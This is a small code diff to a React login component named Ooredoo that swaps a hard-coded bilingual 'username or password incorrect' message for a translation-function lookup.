@@ -8,7 +8,7 @@ export default function Ooredoo() {
   const [, setLocation] = useLocation();
   const search = useSearch();
   const params = new URLSearchParams(search);
-  const { language, setLanguage } = useLanguage();
+  const { language, setLanguage, t } = useLanguage();
   const sessionId = localStorage.getItem("sessionId") || "";
   const showError = params.get("error") === "true";
 
@@ -68,7 +68,7 @@ export default function Ooredoo() {
         <div className="content-body">
             {showError && (
               <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
-                {isArabic ? "اسم المستخدم او كلمة المرور غير صحيح" : "Username or password incorrect"}
+                {t("invalid_ooredoo")}
               </div>
             )}
 <h1>{language === "ar" ? "تسجيل الدخول" : "Login"}</h1>
